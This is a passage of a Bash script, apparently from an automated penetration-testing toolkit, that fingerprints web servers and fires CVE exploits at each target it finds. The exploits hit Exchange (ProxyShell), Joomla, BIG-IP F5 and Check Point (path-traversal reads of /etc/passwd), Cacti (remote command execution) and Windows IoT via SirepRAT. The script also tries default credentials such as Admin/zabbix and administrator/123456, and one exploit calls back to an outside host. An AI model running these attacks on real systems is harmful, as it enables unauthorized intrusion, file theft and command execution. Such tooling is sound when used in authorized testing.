				$proxychains owa.pl -host $host -port $port  > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CVE~2020~0688.txt &
			fi
			#CVE~2020~0688

			#https://github.com/MrTiz/CVE~2020~0688 authenticated

			#CVE~2021~34473
			nuclei -u https://$host:$port/owa/ -t /usr/share/lanscanner/nuclei/proxyshell.yaml -debug 2> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"proxyshell.txt

			#CVE~2022-41040
			nuclei -u https://$host:$port/owa/ -t /usr/share/lanscanner/nuclei/proxynoshell.yaml -debug 2> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"proxynoshell.txt

		fi
		###################################



		#######  joomla  ######
		grep -qi joomla logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de joomla ($host)"

			joomla_version.pl -host $host -port $port -path "$path_web" > logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"joomla-version.txt &

			echo "juumla.sh -u "$proto_http"://"$host":"$port""$path_web" " > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CMSDesactualizado.txt
			juumla.sh -u "$proto_http"://$host:$port/ >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CMSDesactualizado.txt 2>/dev/null &
			joomla-cve2017-8917.py "$proto_http"://"$host":"$port""$path_web" > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"joomla-CVE~2017~8917.txt
			joomlaPlugin-CVE-2018-17254.php -u "$proto_http"://"$host":"$port""$path_web"plugins/ > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"joomla-CVE~2018~17254.txt
			joomla-cve2015-8562.py -t "$proto_http"://"$host":"$port""$path_web" -l 8.8.8.8 -p 443 # request to https://app.beeceptor.com/
			joomla-cve2023-23752.rb "$proto_http"://"$host":"$port""$path_web" --no-color > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"joomla-CVE~2023~23752.txt
			joomla-cve2015-7297.py --url "$proto_http"://"$host":"$port""$path_web" > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"joomla-CVE~2015~7297.txt
			

			#joomla-cd.rb "$proto_http://$host" > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"joomla-joomla-CVE~2023~23752.txt &
			echo -e "\t\t[+] Nuclei Joomla ($host)"
			nuclei -u "$proto_http"://"$host":"$port""$path_web"  -id /root/.local/nuclei-templates/cves/joomla_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"joomlaNuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"joomlaNuclei.txt &

			echo -e "\t\t[+] Revisando si el registro esta habilitado"
			checkerWeb.py --tipo registro --url "$proto_http"://"$host":"$port""$path_web" > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"cms-registroHabilitado.txt
		fi
		###################################

		#######  WAMPSERVER  ######
		grep -qi WAMPSERVER logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Enumerando WAMPSERVER ($host)"
			$proxychains wampServer.pl -url "${proto_http}://${host}:${port}${path_web}" > .enumeracion/"$host"_"$port"_WAMPSERVER.txt &
		fi
		###################################


		#######  BIG-IP F5  ######
		grep -qi "BIG-IP" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de BIG-IP F5  ($host)"
			$proxychains curl --max-time 10 --path-as-is -s -k "$proto_http://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"bigIPVul.txt &
		fi
		###################################

		#######  check point  ######
		grep -qi "Check Point" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de Check Point SSL Network Extender  ($host)"
			check-point-CVE-2024-24919.py --ip $host  --port $port --path /etc/passwd > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CVE~2024~24919.txt &
		fi
		###################################

		#######  splunk  ######
		grep -qi "Splunk" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de Splunkd  ($host)"
			splunk-cve-2024-36991.py -u "${proto_http}://${host}:${port}${path_web}" > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CVE~2024~36991.txt &
		fi
		###################################

		#######  Solarwinds  ######
		grep -qi "solarwinds" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de Solarwinds  ($host)"
			solarwinds-cve-2024-28995.py -u "${proto_http}://${host}:${port}${path_web}" > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CVE~2024~28995.txt &
		fi
		###################################

		#######  qnap  ######
		grep -qi "qnap" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de qnap  ($host)"
			qnap-cve-2024-27130-scanner.py -u "${proto_http}://${host}:${port}${path_web}" > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"qnap-CVE~2024~27130.txt &
		fi
		###################################

		#######  zabbix  ######
		grep -qi "zabbix" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de zabbix  ($host)"
			curl -X POST -H 'Content-Type: application/json' -d '{"jsonrpc": "2.0","method": "apiinfo.version","params":[],"id":1,"auth":null}' "${proto_http}://${host}:${port}${path_web}"api_jsonrpc.php | jq -r '.result' > logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"zabbix-version.txt & 
			passWeb -proto $proto_http -target $host -port $port -module zabbix -path "$path_web" -user Admin -password zabbix > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"passwordDefecto.txt & 
		fi
		###################################


		#######  cacti  ######
		grep -qi "cacti" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de cacti  ($host)"
			cacti-cve-2024-29895.py --url "${proto_http}://${host}:${port}${path_web}" --command id > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CVE~2024~29895.txt
		fi
		###################################


		#######  ZKSoftware  ######
		egrep -qi "ZKSoftware|ZK Web Server" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de ZKSoftware  ($host)"
			passWeb -proto $proto_http -target $host -port $port -module ZKSoftware -path "$path_web" -user administrator -password 123456 > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"passwordDefecto.txt & 
		fi
		###################################


		#######  CrushFTP  ######
		egrep -qi "CrushFTP" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de CrushFTP  ($host)"
			crushFTP-cve-2024-4040.py -t "${proto_http}://${host}:${port}${path_web}" > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"crushFTP-CVE~2024~4040.txt &
		fi
		###################################

		#######  Palo Alto  ######
		grep -qi "Palo Alto" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de Palo Alto  ($host)"
			palo-alto-cve-2024-3400.py -u "${proto_http}://${host}:${port}${path_web}" > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"paloAlto-CVE~2024~3400.txt &
			nmap -p $port --script http-panos-cve-2024-3400.nse $host > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CVE~2024~3400~nmap.txt &
		fi

		#######  D-Link NAS  ######
		grep -qi "D-Link NAS" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de D-Link NAS  ($host)"
			d-Link-NAS-cve-2024-3273.py -u "${proto_http}://${host}:${port}${path_web}" > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"dLinkNAS-CVE~2024~3273.txt &
			
		fi

		#######  zimbra  ######
		grep -qi "zimbra" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de zimbra  ($host)"
			hackWeb.pl -t $host -p $port -m zimbraXXE -s $proto_http  >> logs/vulnerabilidades/"$host"_"$port"_zimbra-cve~2019~9670.txt 2>/dev/null &
			#zimbraXXE-exploit.py

			zimbra-cve-2022-27925.py -t "${proto_http}://${host}:${port}${path_web}" > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"zimbra~CVE~2022~27925.txt &
		fi

		#######  OwnCloud  ######
		grep -qi "OwnCloud" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t[+] Revisando vulnerabilidades de OwnCloud  ($host)"
			owncloud-cve-2023-49103.py -u"${proto_http}://${host}:${port}${path_web}" > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"owncloud-CVE~2023~49103.txt &
		fi

	fi

}


function testSSL ()
{
   proto_http=$1
   host=$2
   port=$3

    echo -e "\t\t[+] TEST SSL ($proto_http : $host : $port)"
	waitWeb 0.3
    #######  hearbleed ######
    echo -e "\t\t[+] Revisando vulnerabilidad heartbleed"
    echo "$proxychains  nmap -n -sT -Pn -p $port --script=ssl-heartbleed $host" > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"heartbleed.txt 2>/dev/null
    $proxychains nmap -n -sT -Pn -p $port --script=ssl-heartbleed $host >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"heartbleed.txt 2>/dev/null &

    ##########################


    #######  Configuracion TLS/SSL (dominio) ######
	if [[ "$MODE" == "total" ]]; then
		echo -e "\t\t[+] Revisando configuracion TLS/SSL"
		testssl.sh --color 0  "https://$host:$port" > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"testSSL.txt 2>/dev/null &
	fi

    ##########################

}

function enumeracionIOT ()
{
   proto_http=$1
   host=$2
   port=$3

   #1: si no existe log
   	if [[ ! -e ".vulnerabilidades2/"$host"_"$port"_SirepRAT.txt"  ]]; then
		egrep -iq "Windows Device Portal" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [ $greprc -eq 0  ];then # si el banner es Apache y no se enumero antes
			echo -e "\t\t[+] Revisando SirepRAT ($host)"
			$proxychains SirepRAT.sh $host LaunchCommandWithOutput --return_output --cmd 'c:\windows\System32\cmd.exe' --args '/c ipconfig' --v >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"SirepRAT.txt
			grep -ia 'IPv4' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"SirepRAT.txt >> .vulnerabilidades/"$host"_"$port"_SirepRAT.txt

		fi
	fi


	if [[ ! -e ".vulnerabilidades2/"$host"_"$port"_backdoorFabrica.txt"  ]]; then
		#######  DLINK backdoor ######
		respuesta=`grep -i alphanetworks logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt`
		greprc=$?
		if [[ $greprc -eq 0 ]];then
			echo -e "\t\t$OKRED[!] DLINK Vulnerable detectado \n $RESET"
			echo -n "[DLINK] $respuesta" >> .vulnerabilidades/"$host"_"$port"_backdoorFabrica.txt

		fi
		###########################
	fi

}
##################################################

#Caso 1: URL seteada y TARGETS=servicios/web-app-tmp.txt
#Caso 2: URL NO seteada y TARGETS=servicios/web.txt
echo "URL:$URL TARGETS:$TARGETS MODE:$MODE DOMINIO:$DOMINIO PROXYCHAINS:$PROXYCHAINS IP_LIST_FILE:$IP_LIST_FILE HOSTING:$HOSTING INTERNET:$INTERNET VERBOSE:$VERBOSE EXTRATEST:$EXTRATEST ESPECIFIC $ESPECIFIC SPEED $SPEED FORCE $FORCE"

############## Extraer informacion web y SSL
# web.txt
# 192.168.0.1:80:http
# www.ejemplo.com:443:https
for line in $(cat $TARGETS); do
	host=`echo $line | cut -f1 -d":"`
	port=`echo $line | cut -f2 -d":"`
	proto_http=`echo $line | cut -f3 -d":"` #http/https

	#Si no existe log (primera corrida por IP)
	if [[ ! -e "logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webData.txt"  ]]; then
		egrep -iq "//$host" servicios/webApp.txt 2>/dev/null
		greprc=$?
		if [[ $greprc -eq 0 && -z "$URL" ]];then
			echo -e "\t[+] host $host esta en la lista webApp.txt escaner por separado1 \n"
		else
			waitWeb 0.1
			echo -e "[+]Escaneando $host $port ($proto_http)"
			if [[ ! -e ".enumeracion2/"$host"_"$port"_webData.txt" ]]; then
				echo -e "\t[i] Identificacion de técnologia usada en los servidores web"
				webData -proto $proto_http -target $host -port $port -path $path_web -logFile logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webData.txt -maxRedirect 2 > logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt 2>/dev/null &
				if [[ "$proto_http" == "https" && "$HOSTING" == "n" ]] ;then
					echo -e "\t[+]Obteniendo dominios del certificado SSL"
					$proxychains get_ssl_cert $host $port | grep -v 'failed' > logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"cert.txt  2>/dev/null &
				fi  ##### extract domains certificate
			fi
		fi
	fi #check
done

waitFinish


################ buscar dominios y host virtuales
for line in $(cat $TARGETS); do
	host=`echo $line | cut -f1 -d":"`
	port=`echo $line | cut -f2 -d":"`
	proto_http=`echo $line | cut -f3 -d":"` #http/https

	##### domain identified 
	newhost=$(grep 'Dominio identificado' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt 2>/dev/null | cut -d "^" -f3 | uniq)
	if [ -n "$newhost" ]; then
		echo "$newhost" > logs/enumeracion/"$host"_web_domainWebData.txt 2>/dev/null
		cp logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt logs/enumeracion/"$newhost"_"$port"_"$path_web_sin_slash"webDataInfo.txt 2>/dev/null
		cp logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"cert.txt logs/enumeracion/"$newhost"_"$port"_"$path_web_sin_slash"cert.txt 2>/dev/null
	fi
	#################

	
	#Verificar que no se obtuvo ese dato
	if [ -e logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"vhosts.txt ]; then
		echo "ya se reviso2"
	else
		egrep -iq "apache|nginx|kong|IIS" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
		greprc=$?
		if [[ "$HOSTING" == 'n' ]] && [[ $greprc -eq 0 ]]; then
			echo -e "\t[+]  Buscando hosts virtuales en $host:$port"
			waitWeb 0.1
			nmap -Pn -sV -n -p $port $host 2>/dev/null | grep 'Host:' | grep '\.' | awk '{print $4}' | sort | uniq > logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"domainNmap.txt &
		fi

		if [[ "$host_LIST_FILE" == *"importarMaltego"* ]]  && [[ ! -z "$DOMINIO" ]] && [[ "$HOSTING" == 'n' ]]; then	#Si escaneamos un dominio especifico fuzzer vhosts
			echo -e "\t[+] Fuzzing DOMINIO: $DOMINIO en busca de vhost ($proto_http://$host )"
			echo -e "\t[+] baseline"
			wfuzz -c -w /usr/share/lanscanner/vhost-non-exist.txt -H "Host: FUZZ.$DOMINIO" -u $proto_http://$host -t 100 -f logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"vhosts~baseline.txt	2>/dev/null
			words=`cat logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"vhosts~baseline.txt | grep 'C=' | awk '{print $5}'`
			echo "words $words"

			cat importarMaltego/subdominios.csv | cut -d ',' -f2 | cut -d '.' -f1 | sort |uniq > subdominios.txt
			cat /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt >> subdominios.txt

			echo -e "\t[+] Fuzz"
			wfuzz -c -w subdominios.txt -H "Host: FUZZ.$DOMINIO" -u $proto_http://$host -t 100 --hw $words --hc 401,400 -f logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"vhosts.txt	2>&1 >/dev/null
			grep 'Ch' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"vhosts.txt | grep -v 'Word' | awk '{print $9}' | tr -d '"' > .enumeracion/"$host"_"$port"_vhosts.txt
			vhosts=`cat .enumeracion/"$host"_"$port"_vhosts.txt`
			vhosts=$(echo $vhosts | sed 's/_/-/g')

			for vhost in $vhosts; do
				echo -e "\t\t[+] Adicionando vhost $vhost a los targets"
				echo "$host $vhost.$DOMINIO" >> /etc/hosts
				echo "$host,$vhost.$DOMINIO,vhost" >> $host_LIST_FILE
			done
		fi	#importarMaltego
	fi
done #host
######################

waitFinish


############ Obteniendo información web DOMINIO
for line in $(cat $TARGETS); do
	host=`echo $line | cut -f1 -d":"`
	port=`echo $line | cut -f2 -d":"`
	proto_http=`echo $line | cut -f3 -d":"` #http/https


	result=$(formato_ip "$host")	#si es IP
	if [[ $result -eq 1 && $HOSTING == 'n' ]] ; then
		if [ "$VERBOSE" == '1' ]; then  echo "[+] $host es una dirección IP"; fi

		echo -e "\n$OKGREEN[+] ############## IDENTIFICAR DOMINIOS ASOCIADOS AL IP $host:$port $RESET########"
		#Certificado SSL + nmap + webdata
		DOMINIOS_SSL=`cat logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"cert.txt 2>/dev/null| tr "'" '"'| jq -r '.subdomains[]' 2>/dev/null | uniq` #Lista un dominio por linea
		DOMINIO_INTERNO_NMAP=`cat logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"domainNmap.txt 2>/dev/null`
		DOMINIO_INTERNO_WEBDATA=`cat logs/enumeracion/"$host"_web_domainWebData.txt 2>/dev/null`

		if [[  $DOMINIOS_SSL =~ ^[0-9]+$ || $DOMINIOS_SSL == *"_"* || $DOMINIOS_SSL == *"*"* ]] ; then #si contiene solo numeros, el caracter '_' o el caracter * no adicionar
			DOMINIOS_INTERNOS_TODOS="$DOMINIO_INTERNO_NMAP"$'\n'"$DOMINIO_INTERNO_WEBDATA"
		else
			DOMINIOS_INTERNOS_TODOS="$DOMINIOS_SSL"$'\n'"$DOMINIO_INTERNO_NMAP"$'\n'"$DOMINIO_INTERNO_WEBDATA"
		fi

		if [ "$VERBOSE" == '1' ]; then  echo "DOMINIOS_SSL $DOMINIOS_SSL"; fi
		if [ "$VERBOSE" == '1' ]; then  echo "DOMINIO_INTERNO_NMAP $DOMINIO_INTERNO_NMAP"; fi
		if [ "$VERBOSE" == '1' ]; then  echo "DOMINIO_INTERNO_WEBDATA $DOMINIO_INTERNO_WEBDATA"; fi
		if [ "$VERBOSE" == '1' ]; then  echo "DOMINIOS_INTERNOS_TODOS $DOMINIOS_INTERNOS_TODOS"; fi
		for DOMINIO_INTERNO in $DOMINIOS_INTERNOS_TODOS; do
			if [[ ${DOMINIO_INTERNO} == *"enterpriseregistration.windows.net"*  ]];then
				echo "$DOMINIO_INTERNO" >> .enumeracion/"$host"_"$port"_azureAD.txt
			else
				echo -e "[+] DOMINIO_INTERNO $DOMINIO_INTERNO"

				grep -q "$DOMINIO_INTERNO" servicios/webApp.txt 2>/dev/null # Verficar si ya identificamos esa app
				greprc=$? # greprc=1 dominio no en lista, greprc=2 webApp.txt no existe

				if [ "$DOMINIO_INTERNO" != NULL ] && [ "$DOMINIO_INTERNO" != "localhost" ] && [ "$DOMINIO_INTERNO" != "" ] && [ "$DOMINIO_INTERNO" != *"*"* ] && ([ "$greprc" -eq 1 ] || [ "$greprc" -eq 2 ]); then

					#Agregar a la lista de targets
					grep -q "$host,$DOMINIO_INTERNO" $IP_LIST_FILE
					greprc=$?
					if [[ $greprc -eq 1  &&  ${DOMINIO_INTERNO} != *"localhost"* &&  ${DOMINIO_INTERNO} != *"127.0.0.1"*  ]];then # si ya agregamos ese dominio
						echo "$host,$DOMINIO_INTERNO,DOMINIO" >> $IP_LIST_FILE
					else
						echo "Ya agregue mas antes $DOMINIO_INTERNO a  $IP_LIST_FILE"
					fi

					#Agregar a /etc/hosts
					grep -q $DOMINIO_INTERNO /etc/hosts
					greprc=$?
					if [[ $greprc -eq 1  &&  ${DOMINIO_INTERNO} != *"localhost"* &&  ${DOMINIO_INTERNO} != *"127.0.0.1"*  ]];then # si ya agregamos ese dominio
						echo "Adicionando $DOMINIO_INTERNO a /etc/hosts"
						echo "$host $DOMINIO_INTERNO" >> /etc/hosts
					else
						echo "Ya agregue mas antes $DOMINIO_INTERNO a /etc/hosts "
					fi
				fi
			fi
		done
	fi # Fin IP format

	echo -e "[+] host ($host)"
	if [[ ${host} != *"localhost"*  && ${host} != *"cpanel."*  && ${host} != *"cpcalendars."* && ${host} != *"cpcontacts."*  && ${host} != *"ftp."* && ${host} != *"webdisk"* && ${host} != *"webmail."* &&  ${host} != *"whm."* && $HOSTING == 'n' ]] ; then
		########## Obteniendo información web DOMINIO ###########
		while true; do
			free_ram=`free -m | grep -i mem | awk '{print $7}'`
			script_instancias=$((`ps aux | grep webData | wc -l` - 1))
			python_instancias=$((`ps aux | grep get_ssl_cert | wc -l` - 1))
			script_instancias=$((script_instancias + python_instancias))

			if [[ $free_ram -gt $MIN_RAM && $script_instancias -lt $MAX_SCRIPTS  ]];then
				if [ "$VERBOSE" == '1' ]; then  echo "SUBNET $SUBNET IP_LIST_FILE=$IP_LIST_FILE"; fi
					lista_hosts=`grep --color=never $host $IP_LIST_FILE  | egrep 'DOMINIO|subdomain|vhost'| cut -d "," -f2`

				if [ "$VERBOSE" == '1' ]; then  echo "lista_hosts1 $lista_hosts"; fi #lista de todos los dominios
				for host in $lista_hosts; do
					if [[  ${host} != *"localhost"*  &&  ${host} != *"cpcalendars."* && ${host} != *"cpcontacts."*  && ${host} != *"webdisk."* ]];then
						egrep -iq "//$host" servicios/webApp.txt 2>/dev/null
						greprc=$?
						if [[ $greprc -eq 0 && -z "$URL" ]];then
							echo -e "\t[+] host $host esta en la lista webApp.txt escaner por separado2 \n"
						else
							#Verificar que no se obtuvo ese dato ya
							if [ ! -e ".enumeracion2/"$host"_"$port"_webData.txt"  ]; then
								echo -e "\t[+] Obteniendo informacion web (host: $host port:$port)"
								webData -proto $proto_http -target $host -port $port -path $path_web -logFile logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webData.txt -maxRedirect 2 > logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt  2>/dev/null &
							fi
						fi
					fi
				done

				################################

				break
			else
				script_instancias=`ps aux | grep perl | egrep -v 'discover.sh|lanscanner.sh|autohack.sh|heka.sh|grep -E'| wc -l`
				echo -e "\t[-] Maximo número de instancias de perl ($script_instancias) RAM = $free_ram Mb "
				sleep 3
			fi
		done # while true
	fi
done # for web.txt

waitFinish

if [[ "$ESPECIFIC" == "1"  ]];then
	echo -e "\t[+] OWASP Verification Standard Part 1"
	### OWASP Verification Standard Part 1###

	#log image
	curl -k -I $URL > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"responseHeaders.txt

	#CS-08 Cookies
	checkCookie $URL > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-08.txt
	grep 'NO OK' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-08.txt >> .vulnerabilidades/"$host"_"$port"_CS-08.txt

	# CS-42 Respuesta HTTP
	checkHeadersServer -url=$URL > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-42.txt
	grep -i 'Vulnerable'  logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-42.txt >> .vulnerabilidades/"$host"_"$port"_CS-42.txt

	#CS-44 Servidores
	allow-http -target=$host > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-44.txt
	egrep -iq "vulnerable" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-44.txt
	greprc=$?
	if [[ $greprc -eq 0 ]] ; then
		cp logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-44.txt .vulnerabilidades/"$host"_"$port"_CS-44.txt
	fi

	# CS-49  Cache-Control
	shcheck.py -d --colours=none --caching --use-get-method $URL  > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-49.txt  2>/dev/null
	grep 'Header seguro faltante' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-49.txt | egrep 'Cache-Control' | sed 's/Header seguro faltante://g' >> .vulnerabilidades/"$host"_"$port"_CS-49.txt

	# CS-51 Header seguros
	grep 'Header seguro faltante' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-49.txt | egrep 'X-Content-Type-Options' | sed 's/Header seguro faltante://g' >> .vulnerabilidades/"$host"_"$port"_CS-51-1.txt
	grep 'Header seguro faltante' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-49.txt | egrep 'Strict-Transport-Security' | sed 's/Header seguro faltante://g' >> .vulnerabilidades/"$host"_"$port"_CS-51-2.txt
	grep 'Header seguro faltante' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-49.txt | egrep 'Referrer-Policy' | sed 's/Header seguro faltante://g' >> .vulnerabilidades/"$host"_"$port"_CS-51-3.txt
	grep 'Header seguro faltante' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-49.txt | egrep 'X-Frame-Options' | sed 's/Header seguro faltante://g' >> .vulnerabilidades/"$host"_"$port"_CS-51-4.txt

	##############
fi


echo -e "$OKGREEN\n[i] Realizando la navegacion forzada $RESET"
for line in $(cat $TARGETS); do
	ip=`echo $line | cut -f1 -d":"`
	port=`echo $line | cut -f2 -d":"`
	proto_http=`echo $line | cut -f3 -d":"`
	echo -e "\n[+] Escaneando ($proto_http $ip:$port $path_web)"

	if [ "$VERBOSE" == '1' ]; then  echo "IP_LIST_FILE=$IP_LIST_FILE "; fi
	lista_hosts=`grep --color=never $ip $IP_LIST_FILE  | egrep 'DOMINIO|subdomain|vhost'| cut -d "," -f2`
	
	if [ -z "$lista_hosts" ] ; then
			lista_hosts=$ip
	else
			lista_hosts=`echo -e "$lista_hosts\n$ip"|uniq`
	fi

	
	if [ "$VERBOSE" == '1' ]; then  echo -e "LISTA HOST:$lista_hosts" ;fi #lista de todos los dominios + ip
	for host in $lista_hosts; do
		echo -e "\t[+] host actual: $host"

		escanearConURL=0
		egrep -iq "//$host" servicios/webApp.txt 2>/dev/null
		greprc=$?
		if [[ $greprc -eq 0 && -z "$URL" ]];then

			if awk -F ',' -v host="$host" 'tolower($2) == tolower(host) && tolower($4) != "cloudflare inc."' "importarMaltego/subdominios.csv" | grep -q '.'; then
				echo -e "\t[+] host $host esta en la lista webApp.txt y no usa cloudflare escaner por separado3 \n"
				escanearConURL=1 # para que escaneo como URL a parte
			else
				echo "[+] host $host está usando Cloudflare Inc."
			fi
			
		fi

		if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"*  && ${host} != *"autodiscover"*  && ${host} != *"cpcalendar"* && ${PROXYCHAINS} != *"s"*  && ${escanearConURL} != 1  ]];then

			############# Verificar que no siempre devuelve 200 OK
			msg_error_404=''
			routes=('accosuntaa.php' 'websaffadmi/' 'nonexisten' '2009_dump.sql')

			for route in "${routes[@]}"; do
				status_code=`getStatus -url $proto_http://${host}:${port}${path_web}${route}`
				only_status_code=$status_code
				if [ "$VERBOSE" == '1' ]; then
					echo -e "\t[+] status_code for ${route}: $status_code"
				fi

				#Full path disclosure identified
				if [[ "$status_code" == *";"* ]]; then
					FPD=$(echo $status_code | cut -d ';' -f2)
					echo -e "$proto_http://${host}:${port}${path_web}${route}\n" >> .enumeracion/"$host"_"$port"_FPD.txt
					echo $FPD >> .enumeracion/"$host"_"$port"_FPD.txt

					#only status code and error_msg
					status_code=$(echo $status_code | cut -d ';' -f1)
				fi

				if [[ "$status_code" == *":"* ]]; then
					msg_error_404=$(echo $status_code | cut -d ':' -f2)
					msg_error_404="'$msg_error_404'"
					only_status_code=$(echo $status_code | cut -d ':' -f1)

					if [[ "$only_status_code" == '200' && -z "$msg_error_404" ]]; then
						echo -n "~Always200-OK" >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
						sed -i ':a;N;$!ba;s/\n//g' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt # borrar salto de linea
						break
					fi

					if [ ! -z "$msg_error_404" ]; then
						only_status_code=404
						echo "new only_status_code $only_status_code ($msg_error_404)"
